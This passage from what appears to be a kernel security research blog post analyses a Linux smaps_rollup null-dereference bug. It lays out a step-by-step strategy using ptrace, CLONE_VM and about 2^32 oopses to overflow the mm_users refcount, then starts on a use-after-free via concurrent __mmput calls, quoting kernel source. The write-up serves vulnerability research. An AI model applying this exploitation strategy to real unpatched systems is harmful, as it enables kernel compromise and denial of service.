 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; __show_smap</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">m</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">&amp;</span><span class="EakHiGVfAD-c7">mss</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c1">true</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c6"><span class="EakHiGVfAD-c2"></span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; release_task_mempolicy</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">priv</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; mmap_read_unlock</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c6"><span class="EakHiGVfAD-c2"></span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">out_put_mm</span><span class="EakHiGVfAD-c0">:</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; mmput</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">out_put_task</span><span class="EakHiGVfAD-c0">:</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; put_task_struct</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">priv</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">task</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; priv</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">task </span><span class="EakHiGVfAD-c0">=</span><span class="EakHiGVfAD-c7">&nbsp;NULL</span><span class="EakHiGVfAD-c0">;</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c6"><span class="EakHiGVfAD-c2"></span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">return</span><span class="EakHiGVfAD-c7">&nbsp;ret</span><span class="EakHiGVfAD-c0">;</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c0">}</span></p></td></tr></table>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6"><span class="EakHiGVfAD-c5"></span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span>This file is intended simply to print a set of memory usage statistics for the respective process. Regardless, </span><span class="EakHiGVfAD-c22"><a class="EakHiGVfAD-c101" href="https://lore.kernel.org/lkml/20221003224531.1930646-1-sethjenkins@google.com/T/">this bug report</a></span><span>&nbsp;reveals a classic and otherwise innocuous null-deref bug within this function. In the case of a task that has no VMA&rsquo;s mapped at all, the task&rsquo;s </span><span class="EakHiGVfAD-c3">mm_struct mmap</span><span>&nbsp;member will be equal to NULL. Thus the </span><span class="EakHiGVfAD-c3">priv-&gt;mm-&gt;mmap-&gt;vm_start</span><span>&nbsp;access causes a null dereference and consequently a kernel oops. This bug can be triggered by simply </span><span class="EakHiGVfAD-c3">read</span><span>&rsquo;ing </span><span class="EakHiGVfAD-c3">/proc/[pid]/smaps_rollup</span><span>&nbsp;on a task with no VMA&rsquo;s (which itself can be stably created via </span><span class="EakHiGVfAD-c3">ptrace</span><span class="EakHiGVfAD-c5">):</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span class="EakHiGVfAD-c5"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjW-7Gf0dWd5QJfxXYwRAdtMX7uoynsldEgf9C7saF7MLL_iwIUVaagMyOAa8r-e4_KDf33viQn5U2w1LirUQnx7Vk1fJgpACWUijAl8Pgtiu8ZrDTaiEzJYSo3pJUX_nh4Mh4EQ2GPclwSCHcA-OmGfexegm4WykTZyKnIq9ktGTiLcCJo0QW0VKx6/s1138/image1.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjW-7Gf0dWd5QJfxXYwRAdtMX7uoynsldEgf9C7saF7MLL_iwIUVaagMyOAa8r-e4_KDf33viQn5U2w1LirUQnx7Vk1fJgpACWUijAl8Pgtiu8ZrDTaiEzJYSo3pJUX_nh4Mh4EQ2GPclwSCHcA-OmGfexegm4WykTZyKnIq9ktGTiLcCJo0QW0VKx6/s1138/image1.png" border="0" alt="Kernel log showing the oops condition backtrace" style="max-height: 750px; max-width: 600px;"title="Kernel log showing the oops condition backtrace" /></a></span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6"><span class="EakHiGVfAD-c19"></span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span class="EakHiGVfAD-c5">This kernel oops will mean that the following events occur:</span></p><ol class="c20 lst-kix_3558t16xb2i9-0 start" start="1"><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span>The associated </span><span class="EakHiGVfAD-c3">struct file </span><span>will have a refcount leaked if </span><span class="EakHiGVfAD-c3">fdget</span><span>&nbsp;took a refcount </span><span>(we&rsquo;ll try and make sure this doesn&rsquo;t happen later)</span></li><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span>The associated </span><span class="EakHiGVfAD-c3">seq_file</span><span>&nbsp;within the </span><span class="EakHiGVfAD-c3">struct file</span><span class="EakHiGVfAD-c5">&nbsp;has a mutex that will forever be locked (any future reads/writes/lseeks etc. will hang forever).</span></li><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span>The </span><span class="EakHiGVfAD-c3">task struct</span><span>&nbsp;associated with the </span><span class="EakHiGVfAD-c3">smaps_rollup</span><span class="EakHiGVfAD-c5">&nbsp;file will have a refcount leaked</span></li><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span>The </span><span class="EakHiGVfAD-c3">mm_struct&rsquo;s mm_users</span><span>&nbsp;refcount</span><span>&nbsp;associated with the task will be leaked</span></li><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span>The </span><span class="EakHiGVfAD-c3">mm_struct&rsquo;s</span><span>&nbsp;</span><span>mmap</span><span class="EakHiGVfAD-c5">&nbsp;lock will be permanently readlocked (any future write-lock attempts will hang forever)</span></li></ol>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6 EakHiGVfAD-c23"><span class="EakHiGVfAD-c5"></span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span>Each of these conditions is an unintentional side-effect that leads to buggy behaviors, but not all of those behaviors are useful to an attacker. </span><span>The permanent locking of events 2 and 5 only makes exploitation more difficult. Condition 1 is unexploitable because we cannot leak the struct file refcount again without taking a mutex that will never be unlocked. Condition 3 is unexploitable because a task struct uses a safe saturating kernel </span><span class="EakHiGVfAD-c3">refcount_t</span><span>&nbsp;which prevents the overflow condition. This leaves condition 4. </span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span><br></span><span>The </span><span class="EakHiGVfAD-c3">mm_users</span><span>&nbsp;refcount still </span><span>uses an overflow-unsafe </span><span class="EakHiGVfAD-c3">atomic_t</span><span>&nbsp;and since we can take a readlock an indefinite number of times, the associated </span><span class="EakHiGVfAD-c3">mmap_read_lock</span><span class="EakHiGVfAD-c5">&nbsp;does not prevent us from incrementing the refcount again. There are a couple important roadblocks we need to avoid in order to repeatedly leak this refcount:</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6"><span class="EakHiGVfAD-c5"></span></p><ol class="c20 lst-kix_dt3x5t4funnl-0 start" start="1"><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span>We cannot call this syscall from the task with the empty vma list itself - in other words, we can&rsquo;t call </span><span class="EakHiGVfAD-c3">read</span><span>&nbsp;from </span><span class="EakHiGVfAD-c3">/proc/self/smaps_rollup</span><span>. Such a process cannot easily make repeated syscalls since it has no virtual memory mapped. We avoid this by reading </span><span class="EakHiGVfAD-c3">smaps_rollup</span><span class="EakHiGVfAD-c5">&nbsp;from another process.</span></li><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span>We must re-open the </span><span class="EakHiGVfAD-c3">smaps_rollup</span><span>&nbsp;file every time because any future reads we perform on a </span><span class="EakHiGVfAD-c3">smaps_rollup</span><span>&nbsp;instance we already triggered the oops on will deadlock on the local </span><span class="EakHiGVfAD-c3">seq_file</span><span>&nbsp;mutex lock which is locked forever. We also need to destroy the resulting </span><span class="EakHiGVfAD-c3">struct file</span><span>&nbsp;(via </span><span class="EakHiGVfAD-c3">close</span><span class="EakHiGVfAD-c5">) after we generate the oops in order to prevent untenable memory usage.</span></li><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span>If we access the </span><span class="EakHiGVfAD-c3">mm</span><span>&nbsp;through the same pid every time, we will run into the </span><span class="EakHiGVfAD-c3">task struct</span><span>&nbsp;</span><span>max refcount before we overflow the </span><span class="EakHiGVfAD-c3">mm_users</span><span>&nbsp;refcount. Thus we need to create two separate tasks that share the same </span><span class="EakHiGVfAD-c3">mm</span><span>&nbsp;and balance the oopses we generate across both tasks so the task refcounts grow half as quickly as the </span><span class="EakHiGVfAD-c3">mm_users</span><span>&nbsp;refcount. We do this via the </span><span class="EakHiGVfAD-c3">clone</span><span>&nbsp;flag </span><span class="EakHiGVfAD-c3">CLONE_VM</span></li><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span>We must avoid opening/reading the </span><span class="EakHiGVfAD-c3">smaps_rollup</span><span>&nbsp;file from a task that has a shared file descriptor table, as otherwise a refcount will be leaked on the </span><span class="EakHiGVfAD-c3">struct file</span><span>&nbsp;itself. This isn&rsquo;t difficult, just don&rsquo;t </span><span class="EakHiGVfAD-c3">read</span><span class="EakHiGVfAD-c5">&nbsp;the file from a multi-threaded process.</span></li></ol>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6"><span class="EakHiGVfAD-c5"></span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span class="EakHiGVfAD-c5">Our final refcount leaking overflow strategy is as follows:<br></span></p><ol class="c20 lst-kix_ehkygwr8rii2-0 start" start="1"><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span class="EakHiGVfAD-c5">Process A forks a process B</span></li><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span>Process B issues </span><span class="EakHiGVfAD-c3">PTRACE_TRACEME</span><span>&nbsp;so that when it segfaults upon return from </span><span class="EakHiGVfAD-c3">munmap</span><span class="EakHiGVfAD-c5">&nbsp;it won&rsquo;t go away (but rather will enter tracing stop)</span></li><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span>Proces B clones with </span><span class="EakHiGVfAD-c3">CLONE_VM | CLONE_PTRACE</span><span class="EakHiGVfAD-c5">&nbsp;another process C</span></li><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span>Process B </span><span class="EakHiGVfAD-c3">munmap</span><span class="EakHiGVfAD-c5">&rsquo;s its entire virtual memory address space - this also unmaps process C&rsquo;s virtual memory address space.</span></li><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span>Process A forks new children D and E which will access (B|C)&rsquo;s </span><span class="EakHiGVfAD-c3">smaps_rollup</span><span class="EakHiGVfAD-c5">&nbsp;file respectively</span></li><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span>(D|E) opens (B|C)&rsquo;s </span><span class="EakHiGVfAD-c3">smaps_rollup</span><span>&nbsp;file and performs a read which will oops, causing (D|E) to die. </span><span class="EakHiGVfAD-c3">mm_users</span><span class="EakHiGVfAD-c5">&nbsp;will be refcount leaked/incremented once per oops</span></li><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span>Process A goes back to step 5 ~2</span><span class="EakHiGVfAD-c18">32</span><span class="EakHiGVfAD-c5">&nbsp;times</span></li></ol>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6"><span class="EakHiGVfAD-c5"></span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span>The above strategy can be </span><span>rearchitected</span><span>&nbsp;to run in parallel (across </span><span class="EakHiGVfAD-c14">processes</span><span>&nbsp;not threads, because of roadblock 4) and improve performance.</span><span>&nbsp;On server setups that print kernel logging to a serial console, generating 2</span><span class="EakHiGVfAD-c18">32</span><span>&nbsp;kernel oopses takes over 2 years. However on a vanilla Kali Linux box using a graphical interface, a demonstrative proof-of-concept takes only about 8 days to complete! At the completion of execution, </span><span>the </span><span class="EakHiGVfAD-c3">mm_users</span><span>&nbsp;refcount will have </span><span>overflow</span><span>ed</span><span>&nbsp;and be set to zero, even though this </span><span class="EakHiGVfAD-c3">mm</span><span>&nbsp;is currently in use by</span><span>&nbsp;multiple processes and can still be referenced via the </span><span class="EakHiGVfAD-c3">proc</span><span class="EakHiGVfAD-c5">&nbsp;filesystem.</span></p><h2 class="EakHiGVfAD-c17 EakHiGVfAD-c8" id="h.6a9h8qcml5lm"><span class="EakHiGVfAD-c12">Exploitation</span></h2>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span>Once the </span><span class="EakHiGVfAD-c3">mm_users</span><span>&nbsp;refcount has been set to zero, triggering undefined behavior and memory corruption </span><span class="EakHiGVfAD-c14">should</span><span>&nbsp;be fairly easy. By triggering an </span><span class="EakHiGVfAD-c3">mmget</span><span>&nbsp;and an </span><span class="EakHiGVfAD-c3">mmput</span><span>&nbsp;(which we can very easily do by opening the </span><span class="EakHiGVfAD-c3">smaps_rollup</span><span>&nbsp;file once more) we should be able to free the entire </span><span class="EakHiGVfAD-c3">mm</span><span class="EakHiGVfAD-c5">&nbsp;and cause a UAF condition:</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6"><span class="EakHiGVfAD-c5"></span></p><a id="t.b3004923779b4f82824e3ea108c266097d5e31bb"></a><a id="t.1"></a><table class="EakHiGVfAD-c16"><tr class="EakHiGVfAD-c21"><td class="EakHiGVfAD-c11" colspan="1" rowspan="1">
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c1">static</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c1">inline</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c1">void</span><span class="EakHiGVfAD-c7">&nbsp;__mmput</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c1">struct</span><span class="EakHiGVfAD-c7">&nbsp;mm_struct </span><span class="EakHiGVfAD-c0">*</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">)</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c0">{</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; VM_BUG_ON</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">atomic_read</span><span class="EakHiGVfAD-c0">(&amp;</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">mm_users</span><span class="EakHiGVfAD-c0">));</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c6"><span class="EakHiGVfAD-c2"></span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; uprobe_clear_state</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; exit_aio</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; ksm_exit</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; khugepaged_exit</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; exit_mmap</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; mm_put_huge_zero_page</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; set_mm_exe_file</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;NULL</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">if</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">(!</span><span class="EakHiGVfAD-c7">list_empty</span><span class="EakHiGVfAD-c0">(&amp;</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">mmlist</span><span class="EakHiGVfAD-c0">))</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">{</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; spin_lock</span><span class="EakHiGVfAD-c0">(&amp;</span><span class="EakHiGVfAD-c7">mmlist_lock</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; list_del</span><span class="EakHiGVfAD-c0">(&amp;</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">mmlist</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; spin_unlock</span><span class="EakHiGVfAD-c0">(&amp;</span><span class="EakHiGVfAD-c7">mmlist_lock</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c0">}</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">if</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">binfmt</span><span class="EakHiGVfAD-c0">)</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; module_put</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">binfmt</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c1">module</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; lru_gen_del_mm</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; mmdrop</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c0">}</span></p></td></tr></table>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6"><span class="EakHiGVfAD-c5"></span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span>Unfortunately, since </span><span class="EakHiGVfAD-c3">64591e8605</span><span class="EakHiGVfAD-c3">&nbsp;(&ldquo;mm: protect free_pgtables with mmap_lock write lock in exit_mmap&rdquo;)</span><span>, </span><span class="EakHiGVfAD-c3">exit_mmap</span><span>&nbsp;unconditionally takes the </span><span>mmap lock</span><span>&nbsp;in write mode. Since this </span><span class="EakHiGVfAD-c3">mm&rsquo;s</span><span>&nbsp;</span><span class="EakHiGVfAD-c3">mmap_lock</span><span>&nbsp;is permanently readlocked </span><span class="EakHiGVfAD-c14">many</span><span>&nbsp;times, any calls to </span><span class="EakHiGVfAD-c3">__mmput</span><span>&nbsp;will manifest as a permanent deadlock inside of </span><span class="EakHiGVfAD-c3">exit_mmap</span><span class="EakHiGVfAD-c5">.</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6"><span class="EakHiGVfAD-c5"></span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span class="EakHiGVfAD-c5">However, before the call permanently deadlocks, it will call several other functions:</span></p><ol class="c20 lst-kix_gx9cg4br20pa-0 start" start="1"><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span class="EakHiGVfAD-c3">u</span><span class="EakHiGVfAD-c3 EakHiGVfAD-c26">probe_clear_state</span></li><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span class="EakHiGVfAD-c26 EakHiGVfAD-c3">exit_aio</span></li><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span class="EakHiGVfAD-c26 EakHiGVfAD-c3">ksm_exit</span></li><li style="margin-left: 46pt;" class="c4 c8 c15 li-bullet-0"><span class="EakHiGVfAD-c3">khugepaged_exit</span></li></ol>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span>Additionally, we can call </span><span class="EakHiGVfAD-c3">__mmput</span><span>&nbsp;on this </span><span class="EakHiGVfAD-c3">mm</span><span>&nbsp;from several tasks simultaneously by having each of them trigger an </span><span class="EakHiGVfAD-c3">mmget/mmput</span><span>&nbsp;on the </span><span class="EakHiGVfAD-c3">mm</span><span>, generating irregular race conditions. Under normal execution, it should not be possible to trigger multiple </span><span class="EakHiGVfAD-c3">__mmput&rsquo;s</span><span>&nbsp;on the same </span><span class="EakHiGVfAD-c3">mm</span><span>&nbsp;(much less concurrent ones) as </span><span class="EakHiGVfAD-c3">__mmput</span><span>&nbsp;should only be called on the last and only refcount decrement which sets the refcount to zero. However, after the refcount overflow, all </span><span class="EakHiGVfAD-c3">mmget</span><span>/</span><span class="EakHiGVfAD-c3">mmput&rsquo;s</span><span>&nbsp;on the still-referenced </span><span class="EakHiGVfAD-c3">mm</span><span>&nbsp;will trigger an </span><span class="EakHiGVfAD-c3">__mmput</span><span>. This is because each </span><span class="EakHiGVfAD-c3">mmput</span><span>&nbsp;that decrements the refcount to zero </span><span>(despite the corresponding </span><span class="EakHiGVfAD-c3">mmget</span><span>&nbsp;being why the refcount was above zero in the first place)</span><span>&nbsp;believes that it is solely responsible for freeing the associated </span><span class="EakHiGVfAD-c3">mm</span><span>.</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6"><span class="EakHiGVfAD-c5"></span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj-cmLd84fS7B5_N1JRJKV3ChuYXr24FB8Yfn7ALBrmzk71O7MXZulCtaF6csA9A3021X9bEruV8iJ2aUBK2q16MfhkL5r1ofXrXEpImakAJPFNmMkeDRK1m3IAPYA3xYDOxP236HaRgDBqXsf_V9wcE9xu9sLSrNIh2hmEqbphe6CwOv7Ld9E0nv2c/s836/image3.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj-cmLd84fS7B5_N1JRJKV3ChuYXr24FB8Yfn7ALBrmzk71O7MXZulCtaF6csA9A3021X9bEruV8iJ2aUBK2q16MfhkL5r1ofXrXEpImakAJPFNmMkeDRK1m3IAPYA3xYDOxP236HaRgDBqXsf_V9wcE9xu9sLSrNIh2hmEqbphe6CwOv7Ld9E0nv2c/s836/image3.png" border="0" alt="Flowchart showing how mmget/mmput on a 0 refcount leads to unsafe concurrent __mmput calls." style="max-height: 750px; max-width: 600px;"title="Flowchart showing how mmget/mmput on a 0 refcount leads to unsafe concurrent __mmput calls." /></a></span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6"><span class="EakHiGVfAD-c19"></span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span>This racy </span><span class="EakHiGVfAD-c3">__mmput</span><span>&nbsp;primitive extends to its callees as well. </span><span class="EakHiGVfAD-c3">exit_aio</span><span class="EakHiGVfAD-c5">&nbsp;is a good candidate for taking advantage of this:</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6"><span class="EakHiGVfAD-c5"></span></p><a id="t.61bc4bf6fdc2b57f4709e87c8b2c1d92281feb30"></a><a id="t.2"></a><table class="EakHiGVfAD-c16"><tr class="EakHiGVfAD-c21"><td class="EakHiGVfAD-c11" colspan="1" rowspan="1">
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c1">void</span><span class="EakHiGVfAD-c7">&nbsp;exit_aio</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c1">struct</span><span class="EakHiGVfAD-c7">&nbsp;mm_struct </span><span class="EakHiGVfAD-c0">*</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">)</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c0">{</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">struct</span><span class="EakHiGVfAD-c7">&nbsp;kioctx_table </span><span class="EakHiGVfAD-c0">*</span><span class="EakHiGVfAD-c7">table </span><span class="EakHiGVfAD-c0">=</span><span class="EakHiGVfAD-c7">&nbsp;rcu_dereference_raw</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">ioctx_table</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">struct</span><span class="EakHiGVfAD-c7">&nbsp;ctx_rq_wait wait</span><span class="EakHiGVfAD-c0">;</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">int</span><span class="EakHiGVfAD-c7">&nbsp;i</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;skipped</span><span class="EakHiGVfAD-c0">;</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c6"><span class="EakHiGVfAD-c2"></span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">if</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">(!</span><span class="EakHiGVfAD-c7">table</span><span class="EakHiGVfAD-c0">)</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">return</span><span class="EakHiGVfAD-c0">;</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c6"><span class="EakHiGVfAD-c2"></span></p>
